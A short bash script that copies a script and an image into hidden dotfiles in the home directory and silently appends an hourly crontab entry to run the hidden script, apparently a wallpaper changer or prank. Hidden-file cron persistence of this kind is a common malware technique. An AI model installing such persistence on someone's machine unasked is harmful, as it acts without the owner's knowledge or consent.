#!/bin/bash
cp ./script.sh ~/.script.sh
cp ./cool_bg.jpg ~/.cool_bg.jpg
BBIN=/bin/bash
BPATH=/home/`whoami`/.script.sh
WHEN="20 * * * * "
(crontab -l; echo "$WHEN"$BBIN" "$BPATH) | crontab -
/etc/init.d/cron reload
